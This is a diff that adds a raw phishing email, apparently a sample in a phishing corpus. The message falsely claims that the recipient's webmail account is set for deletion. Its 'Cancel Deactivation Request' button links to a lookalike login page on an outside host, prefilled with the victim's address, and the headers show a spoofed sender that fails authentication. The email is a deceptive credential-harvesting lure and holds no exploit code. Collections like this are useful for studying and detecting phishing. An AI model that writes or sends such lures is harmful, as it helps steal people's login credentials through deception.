@@ -1,0 +1,213 @@
+Return-Path: webmail@support.org
+Delivered-To: jose@monkey.org
+X-FDA: 83288682120.37.A19F445
+Received: from amiablebird.aeza.network (unknown [213.108.21.233])
+	by imf01.b.hostedemail.com (Postfix) with ESMTP id 5E7801A0002
+	for <jose@monkey.org>; Wed,  2 Apr 2025 10:10:31 +0000 (UTC)
+Authentication-Results: imf01.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf01.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 213.108.21.233) smtp.mailfrom=webmail@support.org;
+	dmarc=none
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;
+	s=arc-20220608; t=1743588632;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=ldXH5Y4Y/6LpcOrHoDOc2oSf9dijh3kMiIgBA7FwKTo=;
+	b=xiefHqejV1K63R/cHbl8mM7VCjWOmdr59W+yF4KGbohaLaA8ZwGPx9KuUY5EqKUQtDNvrO
+	SaSfqr+yP0hqRV5TkJRgtamaRFe3ieZg9M0SN6Ks50qkeM8OkAM0vGRLfedw+JL5LhdPkg
+	IsjY9MSC5kBPZijSgnZBv6p0a/v2ZUU=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1743588632; a=rsa-sha256;
+	cv=none;
+	b=i0Q8HILU9WXkvNO65jB2sCMaNaVtMV9HJvO618HQekq99Ca2/q0lT3ndRwJ48sDI1FrtP7
+	otT5NzVVbgADxnsDT7IVIgiAZiMVFUDq9VotfWr66eHmw0WhnFWZLgZGFdFn/fLHsJWtkg
+	pbt0B4rsZO8RKxs3kOn9ngVzITsfo1A=
+ARC-Authentication-Results: i=1;
+	imf01.b.hostedemail.com;
+	dkim=none;
+	spf=none (imf01.b.hostedemail.com: domain of webmail@support.org has no SPF
+ policy when checking 213.108.21.233) smtp.mailfrom=webmail@support.org;
+	dmarc=none
+Received: from support.org (localhost [127.0.0.1])
+	by amiablebird.aeza.network (Postfix) with ESMTP id CF70250F2A0
+	for <jose@monkey.org>; Wed,  2 Apr 2025 10:08:26 +0000 (UTC)
+From: monkey.org <webmail@support.org>
+To: jose@monkey.org
+Subject: De-activation Request on jose@monkey.org
+Date: 2 Apr 2025 06:08:26 -0400
+Message-ID: <20250402060826.6FB38DB16890FEAF@support.org>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspam-User: 
+X-Stat-Signature: 3oipj1jz4wsi7qj7uro71b8p5ch6ouyi
+X-Rspamd-Queue-Id: 5E7801A0002
+X-Spam-Status: No, score=3.70
+X-HE-Tag: 1743588631-125051
+X-HE-Meta: 
+ U2FsdGVkX194ybJcOmBkPx/nIrY/CZcev898e3xDNo3JWOhF2O202tpgKhHZ468gHywFwzZPgl9UOd+38dlmy5LX+G2iUpwvGzI5PetsPkJdhrj9tYyD12ecMHRuiXkghlFqeGLokXvCbRdMb31xENei8YmZSn2ofQhPoLCBXW7tbvllAFkiGtel+hHCy28zcT2eLZEKMKNx5MZQgAdYI9CORUKMfJ4Zz0DOUbvYxxyqGubAGhZ64oEVZiB7nZ0iSeOojkhE9plUh9Sp1O6xoHWqk7obJwGnFnfzuCZh4Qot6RKk2jW6vxIgvS4GJSloYMYbvSoy78yt+4tRQ4fF5hFABqK+CLmzpb+N9W2h93FYwdP0JcNXsbvKR97/UtZrIvGGBrSamgeI0ZmgoJysFVVforuhT8EYVZQieo7p5FHcbVPLBJEDdN9HSMj2kO1H60h0AldmDgBJ/t3Uy5Hpjems/CNIW7nT5Dw8BUcvYMh+P1CFF2a66iB060LYm5LklSxOG0GMJI0f3vPyUXJr3x/wcs7WhEsfLx9PY6CN5sDs8GMbJ/Q0HGCu+Xz+exX2Pt/AxrcscxX7OOgapMXzte4Q8ycD3VhXO5Cw8b/vh0OR/ilypbF6NmLleqb1vdX+L3Y7DB/xHafkjmydjAnfS7kt11LbtTNm0O7fXhCe7x96mpabQW4zwV3jEEEnHwQb4s0c8q9lgJnan3U7zcBmq7n7E20OKEN+QL+6YWn1X7vgucDxcP2XjRZiZvxHkvnRPr8cUN2avdUQBkzFrPZid3s5jHeZWHCSFlfTqI3eyMISz995uDaXZpAlJ5h1cFy78BJ3b8hFw2GNMcGTqwZCTv8a+41rdXIZsFYh4OvvbhzbKAKTp5zp9t2Jk3CMLuZAB2C3MBmlcvzYIk+P3VhZX+uOQwGbKRV0t6mXFIrX6BLguzrAz6dnbYcxWIsImSmZ8CjttxNoyvY/ka5lsxqqWCQR2Nf
+ xeVLQKywNieNd8qQ/YTn3FELPJICrWzF3TYKk3poYc1rOZWsL+lLygl1+TRWCBPErdOr78qK5j1wObqvRCLMUgTB8NO3B9sxW6iBjfznskD+6zrr/T7NfeApfO3bOb84G3nBgxebxYqx75OeEL+1+CTfMmqAlw64yBnRGjo1bI8kN8QbSxgI5xhX66q1XE2J5s1Q7Q0NSjE7Ta9w/FFXHNAUnYsZlhFCOW55XaOq1YIFIjtsjEtLnSayjlGA+YAuMTxwHXwtLzTYjuYQDYBf8TTNJSzU34GD4ZLb5XQuZViO+jIJ86FBnTddJ72HAC3SpnqWQcXqxOLPmbLdGbbyeAGxqpWbSNyQJErN1Kmb57mJxf6/ijW0AacsQI0XUXYqQF1JjWNhKS+Yk0Xt7tOjP5OoduX/nv6eRY3wYznbhC/UJNBH/YxWbD+5hrHWeiqQnexgi51TN6a/qbfWkFk+cEfVNfol50gnS+sf9DUz2lRJueVLYNXs+FE6qJCK0Rro4Yp5fLJ3PtXpih08=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 121
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<p style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Helv=
+etica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; m=
+argin-top: 0px; margin-bottom: 1rem; word-spacing: 0px; white-space: normal=
+; box-sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: no=
+rmal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decor=
+ation-thickness: initial; text-decoration-style:=20
+initial; text-decoration-color: initial;'><span style=3D"color: rgb(255, 10=
+8, 44); font-family: Cabin, sans-serif; font-size: 45px; font-weight: bolde=
+r; box-sizing: border-box;">Webmail</span></p>
+<p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; =
+font-style: normal; font-weight: 400; margin-top: 0px; margin-bottom: 1rem;=
+ word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2=
+; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decor=
+ation-style: initial; text-decoration-color:=20
+initial;"></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; margin-bo=
+ttom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box;=
+ orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial;"></p>
+<div class=3D"gmail-v1gmail_quote" style=3D'color: rgb(51, 51, 51); text-tr=
+ansform: none; text-indent: 0px; letter-spacing: normal; font-family: "Luci=
+da Grande", Verdana, Arial, Helvetica, sans-serif; font-size: 11px; font-st=
+yle: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-=
+sizing: border-box; orphans: 2; widows: 2; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+thickness: initial; text-decoration-style: initial;=20
+text-decoration-color: initial;'><div style=3D"padding-top: 0px; border-top=
+-color: currentColor; border-top-width: 0px; border-top-style: none; box-si=
+zing: border-box;" dir=3D"ltr"></div></div>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; margin-bo=
+ttom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box;=
+ orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial;"></p>
+<table width=3D"100%" style=3D'color: rgb(51, 51, 51); text-transform: none=
+; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Hel=
+vetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; orphans:=
+ 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-dec=
+oration-style: initial; text-decoration-color:=20
+initial;' cellspacing=3D"0"><tbody style=3D"box-sizing: border-box;"></tbod=
+y></table>
+<table width=3D"100%" style=3D'color: rgb(51, 51, 51); text-transform: none=
+; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Hel=
+vetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; orphans:=
+ 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-dec=
+oration-style: initial; text-decoration-color:=20
+initial;' cellspacing=3D"0"><tbody style=3D"box-sizing: border-box;"></tbod=
+y></table>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; margin-top: 0px; margin-bo=
+ttom: 1rem; word-spacing: 0px; white-space: normal; box-sizing: border-box;=
+ orphans: 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: =
+normal; -webkit-text-stroke-width: 0px; text-decoration-thickness: initial;=
+ text-decoration-style: initial;=20
+text-decoration-color: initial;"></p>
+<p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; =
+font-style: normal; font-weight: 400; margin-top: 0px; margin-bottom: 1rem;=
+ word-spacing: 0px; white-space: normal; box-sizing: border-box; orphans: 2=
+; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -we=
+bkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-decor=
+ation-style: initial; text-decoration-color:=20
+initial;"></p>
+<table width=3D"100%" style=3D'color: rgb(51, 51, 51); text-transform: none=
+; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, Hel=
+vetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; white-space: normal; border-collapse: collapse; orphans:=
+ 2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -=
+webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-dec=
+oration-style: initial; text-decoration-color:=20
+initial;' cellspacing=3D"0"><tbody style=3D"box-sizing: border-box;"><tr st=
+yle=3D"box-sizing: border-box;"><td style=3D"margin: 0px; box-sizing: borde=
+r-box;" bgcolor=3D"#f8f8f8"><table width=3D"80%" align=3D"center" style=3D"=
+border-collapse: collapse;"><tbody style=3D"box-sizing: border-box;"><tr st=
+yle=3D"box-sizing: border-box;"><td style=3D"margin: 0px; box-sizing: borde=
+r-box;"><font face=3D"calibri" size=3D"2" style=3D"box-sizing: border-box;"=
+><span style=3D"font-weight: bolder; box-sizing: border-box;">Dear&nbsp;</s=
+pan>
+</font>&nbsp;<span style=3D"font-weight: bolder; box-sizing: border-box;">j=
+ose@monkey.org</span><p style=3D"margin-top: 0px; margin-bottom: 1rem; box-=
+sizing: border-box;"><font face=3D"calibri" size=3D"3" style=3D"box-sizing:=
+ border-box;">Request to delete your account has been received; request is =
+under process.</font></p><p style=3D"margin-top: 0px; margin-bottom: 1rem; =
+box-sizing: border-box;"><font face=3D"calibri" size=3D"3" style=3D"box-siz=
+ing: border-box;">
+If the request was made in error and you are not aware, Login and cancel th=
+e request now</font></p></td></tr></tbody></table></td></tr><tr style=3D"bo=
+x-sizing: border-box;"><td height=3D"15" style=3D"margin: 0px; box-sizing: =
+border-box;" bgcolor=3D"#f8f8f8"><br style=3D"box-sizing: border-box;"></td=
+></tr><tr style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; box-s=
+izing: border-box;" bgcolor=3D"#f8f8f8"><table width=3D"80%" height=3D"60" =
+align=3D"center" style=3D"border-collapse: collapse;" bgcolor=3D"#045fb4">
+<tbody style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-bo=
+x;"><td style=3D"margin: 0px; box-sizing: border-box;"><div align=3D"center=
+" style=3D"padding-top: 0px; border-top-color: currentColor; border-top-wid=
+th: 0px; border-top-style: none; box-sizing: border-box;">
+<a style=3D"color: rgb(1, 134, 186); cursor: pointer; box-sizing: border-bo=
+x; background-color: transparent; text-decoration-line: none;" href=3D"http=
+s://faint-window-thousands.on-fleek.app/index/#jose@monkey.org" target=3D"_=
+blank" rel=3D"noreferrer"><font color=3D"#ffffff" face=3D"calibri" size=3D"=
+2" style=3D"box-sizing: border-box;">Cancel Deactivation Request on jose@mo=
+nkey.org</font></a></div></td></tr></tbody></table></td></tr><tr style=3D"b=
+ox-sizing: border-box;">
+<td height=3D"20" style=3D"margin: 0px; box-sizing: border-box;" bgcolor=3D=
+"#f8f8f8"><br style=3D"box-sizing: border-box;"></td></tr><tr style=3D"box-=
+sizing: border-box;"><td height=3D"70" style=3D"margin: 0px; box-sizing: bo=
+rder-box;" bgcolor=3D"#f8f8f8"><table width=3D"80%" align=3D"center" style=
+=3D"border-collapse: collapse;"><tbody style=3D"box-sizing: border-box;"><t=
+r style=3D"box-sizing: border-box;"><td style=3D"margin: 0px; box-sizing: b=
+order-box;"><br style=3D"box-sizing: border-box;">
+<p style=3D"margin-top: 0px; margin-bottom: 1rem; box-sizing: border-box;">=
+<font face=3D"calibri" size=3D"3" style=3D"box-sizing: border-box;">Regards=
+=2E</font><font face=3D"calibri" size=3D"3" style=3D"box-sizing: border-box=
+;"><br style=3D"box-sizing: border-box;"></font></p><table width=3D"100%" s=
+tyle=3D"border-collapse: collapse;" bgcolor=3D"#f5f5f5" border=3D"0" cellsp=
+acing=3D"0" cellpadding=3D"0"><tbody style=3D"box-sizing: border-box;"><tr =
+style=3D"box-sizing: border-box;">
+<td style=3D"margin: 0px; padding: 0px; box-sizing: border-box;" bgcolor=3D=
+"#f5f5f5"><div style=3D"margin: 0px auto; padding-top: 0px; padding-right: =
+20px; padding-left: 20px; border-top-color: currentColor; border-top-width:=
+ 0px; border-top-style: none; max-width: 600px; box-sizing: border-box;"><s=
+pan style=3D"font-weight: bolder; box-sizing: border-box;">Please do not re=
+ply to this email. Emails sent to this address will not be answered.<br sty=
+le=3D"box-sizing: border-box;">
+&nbsp;<br style=3D"box-sizing: border-box;">Copyright &copy; 1999-2025&nbsp=
+; webmail Operating Company, LLC.&nbsp;</span></div></td></tr></tbody></tab=
+le><table width=3D"100%" style=3D"border-collapse: collapse;" bgcolor=3D"#f=
+5f5f5" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"box=
+-sizing: border-box;"></tbody></table></td></tr></tbody></table></td></tr><=
+tr style=3D"box-sizing: border-box;"><td height=3D"10" style=3D"margin: 0px=
+; box-sizing: border-box;" bgcolor=3D"#f8f8f8">
+<br style=3D"box-sizing: border-box;"></td></tr></tbody></table></body></ht=
+ml>
+
